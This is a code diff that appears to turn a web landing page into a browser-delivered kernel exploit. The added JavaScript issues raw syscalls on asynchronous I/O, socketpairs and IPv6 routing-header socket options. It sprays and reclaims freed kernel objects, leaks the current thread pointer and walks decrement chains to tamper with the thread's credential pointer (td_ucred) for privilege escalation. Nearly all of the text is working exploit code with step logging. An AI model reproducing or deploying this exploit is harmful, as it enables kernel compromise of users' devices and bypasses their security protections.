+      "PR-SATURATE",
+      "rv=" +
+        sc(
+          SYS.aio_submit_cmd,
+          1 | 0x1000,
+          bufAddr(brqAb),
+          NBLOCK,
+          3,
+          bufAddr(bidAb),
+        ).i32,
+    );
+
+    const spAb = new ArrayBuffer(8);
+    keepAlive.push(spAb);
+    const spDv = new DataView(spAb);
+    if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, bufAddr(spAb)).i32 !== 0) {
+      mark("PR-ABORT", "socketpair");
+      return;
+    }
+    const sp0 = spDv.getInt32(0, true),
+      sp1 = spDv.getInt32(4, true);
+    opened.push(sp0, sp1);
+    const rbAb = new ArrayBuffer(0x40);
+    keepAlive.push(rbAb);
+    const rqAb = new ArrayBuffer(0x50);
+    keepAlive.push(rqAb);
+    const rqDv = new DataView(rqAb);
+    for (let k = 0; k < 2; k++) {
+      const b = k * 0x28;
+      put(rqDv, b + 0x08, 0x40);
+      put(rqDv, b + 0x10, bufAddr(rbAb));
+      rqDv.setInt32(b + 0x20, sp0, true);
+    }
+    const idAb2 = new ArrayBuffer(8);
+    keepAlive.push(idAb2);
+    const idAd2 = bufAddr(idAb2);
+    const stAb2 = new ArrayBuffer(8);
+    keepAlive.push(stAb2);
+    const stAd2 = bufAddr(stAb2);
+    const toAb = new ArrayBuffer(8);
+    keepAlive.push(toAb);
+    const toDv = new DataView(toAb),
+      toAd = bufAddr(toAb);
+
+    const TOWAIT = params.get("towait")
+      ? parseInt(params.get("towait"), 10)
+      : 1000;
+    toDv.setUint32(0, TOWAIT, true);
+    toDv.setUint32(4, 0, true);
+    mark(
+      "PR-TOWAIT",
+      "aio_multi_wait timeout=" +
+        TOWAIT +
+        "us was=100000us" +
+        " deaths_in_that_sleep=all armings=4 exposure_was=400ms",
+    );
+    const POOL = [];
+    for (let i = 0; i < SPRAY; i++) {
+      const fd = sc(SYS.socket, AF_INET6, SOCK_DGRAM, 0).i32;
+      if (fd < 0) break;
+      POOL.push(fd);
+      opened.push(fd);
+    }
+    mark("PR-POOL", "reclaim sockets=" + POOL.length);
+    const pAb = new ArrayBuffer(RTH_SIZE);
+    keepAlive.push(pAb);
+    const pDv = new DataView(pAb),
+      pAd = bufAddr(pAb);
+    function setNode0(nextAddr, secondDec) {
+      new Uint8Array(pAb).fill(0);
+      pDv.setUint8(1, RTH_LEN);
+      pDv.setUint8(3, RTH_SEGLEFT);
+      put(pDv, 0x08, secondDec);
+      put(pDv, 0x10, M_AD);
+      put(pDv, 0x30, nextAddr);
+    }
+    let armCount = 0;
+    let waitMs = -1;
+
+    let armTrace = false;
+    const REAP = params.get("reap") !== "0";
+    const REAPLEAK = params.get("reapleak") !== "0";
+    const PARK = params.get("park") === "1";
+    let reapedGen = -1;
+    function armOnce() {
+      try {
+        if (typeof A !== "undefined" && A) A.busy = 1;
+      } catch (e) {}
+
+      const g = armCount + 1;
+      const at = function (t, d) {
+        if (armTrace) trace(t, "a=" + g + " " + d);
+      };
+      at("ARM-P1-FREE", "pool=" + POOL.length);
+      for (const fd of POOL)
+        sc(SYS.setsockopt, fd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
+      at("ARM-P2-SUBMIT", "freed=" + POOL.length);
+      const rs = sc(
+        SYS.aio_submit_cmd,
+        1 | 0x1000,
+        bufAddr(rqAb),
+        2,
+        3,
+        idAd2,
+      ).i32;
+      if (rs !== 0) {
+        at("ARM-SUBMIT-FAIL", "rs=" + rs);
+        return "submit=" + rs;
       }
 
-      body.done #spin {
-        display: none;
+      toDv.setUint32(0, TOWAIT, true);
+      toDv.setUint32(4, 0, true);
+      at(
+        "ARM-P3-WAIT",
+        "to=" +
+          TOWAIT +
+          "us submit=0 to_rb=" +
+          toDv.getUint32(0, true) +
+          " toad=" +
+          toAd,
+      );
+      const tw0 = Date.now();
+      sc(SYS.aio_multi_wait, idAd2, 2, stAd2, 0, toAd);
+      waitMs = Date.now() - tw0;
+      at("ARM-P4-SPRAY", "wait=" + waitMs + "ms");
+      let n = 0;
+      for (const fd of POOL)
+        if (
+          sc(SYS.setsockopt, fd, IPPROTO_IPV6, IPV6_RTHDR, pAd, RTH_SIZE)
+            .i32 === 0
+        )
+          n++;
+      armCount++;
+      at("ARM-P5-ARMED", "sprayed=" + n + " wait=" + waitMs + "ms");
+      return "ok sprayed=" + n + " wait=" + waitMs + "ms";
+    }
+
+    const lkNodes = new ArrayBuffer(NODE_SZ * N_LEAK);
+    keepAlive.push(lkNodes);
+    const lkNdv = new DataView(lkNodes),
+      lkNad = bufAddr(lkNodes);
+    async function leakCurthread(w) {
+      toDv.setUint32(0, TOWAIT, true);
+      toDv.setUint32(4, 0, true);
+      new Uint8Array(lkNodes).fill(0);
+      for (let i = 0; i < N_LEAK; i++) {
+        const o = i * NODE_SZ;
+        put(lkNdv, o + 0x00, LX);
+        put(lkNdv, o + 0x08, LC);
+        put(lkNdv, o + 0x10, M_AD);
+        put(lkNdv, o + 0x30, i === N_LEAK - 1 ? 0 : lkNad.add32(o + NODE_SZ));
       }
-      body.fail #spin {
-        display: none;
-      }
-      body.fail #msg {
-        display: block;
+      lkDv.setInt32(0x00, 0x40000000, true);
+      lkDv.setInt32(0x10, 0x40000000, true);
+      mU32[6] = 4;
+      mU32[7] = 0;
+      setNode0(lkNad, LC);
+      const a = armOnce();
+      if (a.indexOf("ok") !== 0) {
+        mark("PR-LEAK-ARM", w.name + " " + a);
+        return null;
       }
 
-      /* ?log=1 -- the full step log, styled like the landing. */
-      body.log #spin,
-      body.log #msg {
-        display: none;
+      {
+        let wu = 0;
+        for (let i = 0; i < 200000; i++) {
+          mU8[0x30 + (i & 15)] = i & 0xff;
+          wu ^= mU32[OWNER_LO];
+        }
+        if (wu === 0x7fffffff) mark("PR-WARM", "" + wu);
       }
-      body.log #wrap {
-        padding: 14px 18px;
+      const samples = [];
+      let hitLo = 0,
+        hitHi = 0,
+        hits = 0;
+      let pr = null;
+      try {
+        pr = w.fire(SYS.aio_multi_cancel, [idAd2, 1, stAd2]);
+      } catch (e) {}
+      for (let i = 0; i < SPIN; i++) {
+        mU8[0x30 + (i & 15)] = i & 0xff;
+        const hi1 = mU32[OWNER_HI];
+        if (hi1 !== 0) {
+          const lo = mU32[OWNER_LO];
+          const hi2 = mU32[OWNER_HI];
+
+          if (hi1 === hi2 && lo !== 4) {
+            if (!hits) {
+              hitLo = lo;
+              hitHi = hi1;
+            }
+            hits++;
+            if (samples.length < 32)
+              samples.push(
+                (hi1 >>> 0).toString(16).padStart(8, "0") +
+                  (lo >>> 0).toString(16).padStart(8, "0"),
+              );
+            if (hits > 48) break;
+          }
+        }
       }
-      body.log #state {
-        display: block;
-        font-size: 22px;
-        font-weight: 700;
-        margin: 0 0 8px;
+      const drop = 0x40000000 - lkDv.getInt32(0x00, true);
+      const uniq = {};
+      for (const v of samples) uniq[v] = (uniq[v] || 0) + 1;
+      const keys = Object.keys(uniq);
+      mark(
+        "PR-LEAK",
+        w.name +
+          " hits=" +
+          hits +
+          " walked=" +
+          drop +
+          "/" +
+          N_LEAK +
+          " samples=" +
+          (keys.length
+            ? keys.map((k) => k + " x" + uniq[k]).join(" ")
+            : "none"),
+      );
+      try {
+        if (pr) await pr;
+      } catch (e) {}
+      if (!hits || hitHi >>> 0 < 0xffff0000 || keys.length !== 1) return null;
+      return new int64(hitLo >>> 0, hitHi >>> 0);
+    }
+    const CT1 = await leakCurthread(w1);
+    armTrace = true;
+
+    if (REAPLEAK) {
+      put(lkNdv, 0x00, LX);
+      put(lkNdv, 0x08, LC);
+      put(lkNdv, 0x30, 0);
+      const rlc = sc(SYS.aio_multi_cancel, idAd2, 2, stAd2).i32;
+      const rlp = sc(SYS.aio_multi_poll, idAd2, 2, stAd2).i32;
+      const rld = sc(SYS.aio_multi_delete, idAd2, 2, stAd2).i32;
+      mark("PR-REAPLEAK", "cancel=" + rlc + " poll=" + rlp + " delete=" + rld);
+    } else {
+      mark("PR-REAPLEAK", "skipped park=" + (PARK ? 1 : 0));
+    }
+
+    mark(
+      "PR-CURTHREADS",
+      "w1=" +
+        CT1 +
+        " (w2 not leaked: one arming saved)" +
+        "  -- both workers are now PARKED and issue no further syscalls",
+    );
+
+    let parkFail = "";
+    if (!PARK) {
+      mark(
+        "PR-PARK",
+        "skipped park=0 restore=self reapleak=" + (REAPLEAK ? 1 : 0),
+      );
+    } else {
+      const prev = w1.worker.onmessage;
+      w1.worker.onmessage = function (e) {
+        const d = e.data || {};
+
+        if (d.id === -1) {
+          parkFail += " " + (d.value || d.type);
+          return;
+        }
+        if (prev) prev.call(this, e);
+      };
+      w1.worker.postMessage({ id: -1, name: "spin", args: [] });
+      await new Promise((r) => setTimeout(r, 250));
+      mark("PR-PARK", "w1 spin posted parkfail=" + (parkFail || "none"));
+    }
+    if (
+      PARK &&
+      !check(
+        "W1-PARKED",
+        parkFail === "",
+        parkFail
+          ? "rpc_worker.js has no spin():" +
+              parkFail +
+              " -- reload, nothing kernel has been touched yet"
+          : "w1 cannot reach syscallenter again, so cred_update_thread can" +
+              " never crfree() the wild td_ucred passA is about to create",
+      )
+    )
+      return;
+
+    const STEP_OFF = 2,
+      STEP_MAG = 0x10000,
+      PAIR = STEP_MAG + 1;
+    const TD_UCRED_OFF = 0x130,
+      CR_RUID_OFF = 0x08;
+    const KA = params.get("ka") ? parseInt(params.get("ka"), 10) : 32768;
+    const KB = PAIR;
+
+    const dumAb = new ArrayBuffer(0x40);
+    keepAlive.push(dumAb);
+    const dumDv = new DataView(dumAb),
+      dumAd = bufAddr(dumAb);
+    dumDv.setInt32(0x00, 0x40000000, true);
+    const DUM = dumAd.add32(0x00);
+    const snkAb = new ArrayBuffer(0x40);
+    keepAlive.push(snkAb);
+    const snkDv = new DataView(snkAb),
+      snkAd = bufAddr(snkAb);
+    const SNK = snkAd.add32(0x00);
+    const N0SINK = snkAd.add32(0x20);
+
+    const MAXN = 2 * KA + KB + 16;
+    const arAb = new ArrayBuffer(NODE_SZ * MAXN);
+    keepAlive.push(arAb);
+    const arDv = new DataView(arAb),
+      arAd = bufAddr(arAb);
+    mark(
+      "PR-ARENA",
+      "nodes=" +
+        MAXN +
+        " bytes=0x" +
+        (NODE_SZ * MAXN).toString(16) +
+        " @" +
+        arAd,
+    );
+
+    function wnode(i, decAddr, sinkAddr, last) {
+      const o = i * NODE_SZ;
+      put(arDv, o + 0x00, decAddr);
+      put(arDv, o + 0x08, sinkAddr);
+      put(arDv, o + 0x10, M_AD);
+      put(arDv, o + 0x18, 0);
+      put(arDv, o + 0x20, 0);
+      put(arDv, o + 0x28, 0);
+      put(arDv, o + 0x30, last ? 0 : arAd.add32(o + NODE_SZ));
+    }
+
+    const gfAb = new ArrayBuffer(0x80);
+    keepAlive.push(gfAb);
+    const gfDv = new DataView(gfAb),
+      gfAd = bufAddr(gfAb);
+    const glAb = new ArrayBuffer(8);
+    keepAlive.push(glAb);
+    const glDv = new DataView(glAb),
+      glAd = bufAddr(glAb);
+    function whoHasF() {
+      let found = -1,
+        hits = 0,
+        state0 = 0;
+      for (let i = 0; i < POOL.length; i++) {
+        glDv.setInt32(0, RTH_SIZE, true);
+        glDv.setInt32(4, 0, true);
+        new Uint8Array(gfAb).fill(0);
+        if (
+          sc(SYS.getsockopt, POOL[i], IPPROTO_IPV6, IPV6_RTHDR, gfAd, glAd)
+            .i32 !== 0
+        )
+          continue;
+        const st = gfDv.getUint32(0x20, true) >>> 0;
+        if (st !== 0) {
+          hits++;
+          if (found < 0) {
+            found = i;
+            state0 = st;
+          }
+        }
       }
-      body.log #out {
-        display: block;
-        white-space: pre-wrap;
-        font:
-          12px/1.45 Consolas,
-          monospace;
-        background: #11151b;
-        border: 1px solid #1e2732;
-        border-radius: 5px;
-        padding: 10px 12px;
-        height: calc(100vh - 141px);
-        overflow-y: auto;
+      return { idx: found, hits: hits, state: state0 };
+    }
+
+    function reapNow(tag) {
+      if (!REAP || reapedGen === armCount) return;
+      wnode(0, DUM, DUM, true);
+      reapedGen = armCount;
+      const c = sc(SYS.aio_multi_cancel, idAd2, 2, stAd2).i32;
+      const p = sc(SYS.aio_multi_poll, idAd2, 2, stAd2).i32;
+      const d = sc(SYS.aio_multi_delete, idAd2, 2, stAd2).i32;
+      post(
+        "REAP",
+        tag +
+          " gen=" +
+          reapedGen +
+          " cancel=" +
+          c +
+          " poll=" +
+          p +
+          " delete=" +
+          d,
+      );
+    }
+
+    function runChain(nNodes, label) {
+      snkDv.setInt32(0x00, 0x40000000, true);
+      snkDv.setInt32(0x20, 0x40000000, true);
+
+      trace(
+        "CH-MTX-PRE",
+        label +
+          " owner=" +
+          (mU32[OWNER_HI] >>> 0).toString(16) +
+          ":" +
+          (mU32[OWNER_LO] >>> 0).toString(16) +
+          " want=0:4",
+      );
+      mU32[OWNER_LO] = 4;
+      mU32[OWNER_HI] = 0;
+      setNode0(arAd, N0SINK);
+      const a = armOnce();
+      if (a.indexOf("ok") !== 0) {
+        mark("PR-ARM-FAIL", label + " " + a);
+        return null;
       }
-      .ok {
-        color: #7fd0a0;
+      trace("CH-CANCEL", label + " nodes=" + nNodes + " walking");
+      sc(SYS.aio_multi_cancel, idAd2, 1, stAd2);
+      trace("CH-CANCEL-DONE", label + " returned");
+      const moved = 0x40000000 - snkDv.getInt32(0x00, true);
+      const n0 = 0x40000000 - snkDv.getInt32(0x20, true);
+      const w = whoHasF();
+      mark(
+        "PR-FIRE",
+        label +
+          " nodes=" +
+          nNodes +
+          " sink_moved=" +
+          moved +
+          " node0_sink=" +
+          n0 +
+          " f_socket=" +
+          w.idx +
+          " f_hits=" +
+          w.hits +
+          " state=0x" +
+          w.state.toString(16) +
+          " (" +
+          a +
+          ")",
+      );
+      if (n0 === 1 && w.idx < 0)
+        mark(
+          "PR-F-UNSEEN",
+          "node0 fired but no pool socket carries the" +
+            " state write -- F went to something outside the pool",
+        );
+      reapNow("a=" + armCount);
+      return moved;
+    }
+
+    const X1 = CT1.add32(TD_UCRED_OFF);
+    mark(
+      "PR-PASSA-TARGET",
+      "X1 = w1.curthread+0x130 (td_ucred) = " +
+        X1 +
+        "  KA=" +
+        KA +
+        " pair=0x" +
+        PAIR.toString(16) +
+        " covers up to " +
+        KA * PAIR,
+    );
+    {
+      let i = 0;
+      for (let j = 0; j < KA; j++) {
+        wnode(i++, X1.add32(STEP_OFF), DUM, false);
+        wnode(i++, X1, SNK, false);
       }
-      .bad {
-        color: #d08a7f;
+
+      const subA = (0x100000000 - ((KA * PAIR) % 0x100000000)) % 0x100000000;
+      const dA = [
+        subA & 0xff,
+        (subA >>> 8) & 0xff,
+        (subA >>> 16) & 0xff,
+        (subA >>> 24) & 0xff,
+      ];
+      const nA = dA[0] + dA[1] + dA[2] + dA[3];
+      mark(
+        "PR-RESTOREA",
+        "passA subtracted " +
+          KA * PAIR +
+          " sub=0x" +
+          subA.toString(16) +
+          " digits=" +
+          dA.join(",") +
+          " nodes=" +
+          nA,
+      );
+      if (!check("pr-restorea-bounded", nA >= 1 && nA <= 1020, "n=" + nA))
+        return;
+      {
+        const pa = [];
+        for (let j = 0; j < 4; j++) for (let d = 0; d < dA[j]; d++) pa.push(j);
+        for (let j = 0; j < pa.length; j++)
+          wnode(i++, X1.add32(pa[j]), DUM, j === pa.length - 1);
       }
-      .warn {
-        color: #d8c07f;
+      const mA = runChain(i, "passA");
+      if (mA === null) return;
+      if (mA <= 0) {
+        mark(
+          "PR-PASSA-NOCROSS",
+          "no crossing: low dword either exceeds " +
+            KA * PAIR +
+            " or is already negative (top bit set)",
+        );
+        if (retryBenign("passA-nocross")) return;
+        check("POINTER-READ", false, "pass A found no crossing");
+        return;
       }
-      .safe {
-        color: #7fd0a0;
+      var kA = KA - mA + 1;
+      mark(
+        "PR-PASSA",
+        "m=" +
+          mA +
+          " -> k=" +
+          kA +
+          "  W0 in (" +
+          (kA - 1) * PAIR +
+          ", " +
+          kA * PAIR +
+          "]",
+      );
+    }
+
+    const RED = (kA - 1) * PAIR;
+    const dga = [
+      RED & 0xff,
+      (RED >>> 8) & 0xff,
+      (RED >>> 16) & 0xff,
+      (RED >>> 24) & 0xff,
+    ];
+    const nDga = dga[0] + dga[1] + dga[2] + dga[3];
+    mark(
+      "PR-RESTORE-PLAN",
+      "reduce=" + RED + " digits=" + dga.join(",") + " nodes=" + nDga,
+    );
+    if (
+      !check(
+        "pr-restore-bounded",
+        nDga > 0 && nDga <= 1020 && RED > 0,
+        "n=" + nDga,
+      )
+    )
+      return;
+    const X2 = X1;
+    mark(
+      "PR-PASSB-TARGET",
+      "x2=" + X2 + " same_copy=1 restore_digits=" + nDga + " probes=" + KB,
+    );
+    let W0 = 0;
+    {
+      let i = 0;
+      const posA = [];
+      for (let j = 0; j < 4; j++) for (let d = 0; d < dga[j]; d++) posA.push(j);
+      for (let j = 0; j < posA.length; j++)
+        wnode(i++, X2.add32(posA[j]), DUM, false);
+      for (let j = 0; j < KB; j++) wnode(i++, X2, SNK, false);
+
+      const totB = (RED + KB) % 0x100000000;
+      const subB = (0x100000000 - totB) % 0x100000000;
+      const dB = [
+        subB & 0xff,
+        (subB >>> 8) & 0xff,
+        (subB >>> 16) & 0xff,
+        (subB >>> 24) & 0xff,
+      ];
+      const nB = dB[0] + dB[1] + dB[2] + dB[3];
+      mark(
+        "PR-RESTOREB",
+        "passB subtracted " +
+          totB +
+          " sub=0x" +
+          subB.toString(16) +
+          " digits=" +
+          dB.join(",") +
+          " nodes=" +
+          nB,
+      );
+
+      if (
+        !check(
+          "pr-restoreb-bounded",
+          nB >= 1 && nB <= 1020,
+          "n=" + nB + " min=1 max=1020 unterminated_if=0",
+        )
+      ) {
+        mark("REFUSING-TO-ARM", "reason=passb-restore-empty");
+        return;
       }
-      .danger {
-        color: #d08a7f;
+      {
+        const pb = [];
+        for (let j = 0; j < 4; j++) for (let d = 0; d < dB[j]; d++) pb.push(j);
+        for (let j = 0; j < pb.length; j++)
+          wnode(i++, X2.add32(pb[j]), DUM, j === pb.length - 1);
       }
-      code {
-        color: #9fb3d0;
+      const mB = runChain(i, "passB");
+      if (mB === null) return;
+      if (mB <= 0) {
+        mark(
+          "PR-PASSB-NOCROSS",
+          "remainder never crossed -- k may be off" +
+            " by one, or the two threads' td_proc differ",
+        );
+        if (retryBenign("passB-nocross")) return;
+        check("POINTER-READ", false, "pass B found no crossing");
+        return;
       }
-    </style>
-  </head>
-  <body>
-    <div id="brand">
-      <img
-        src="data:image/png;base64,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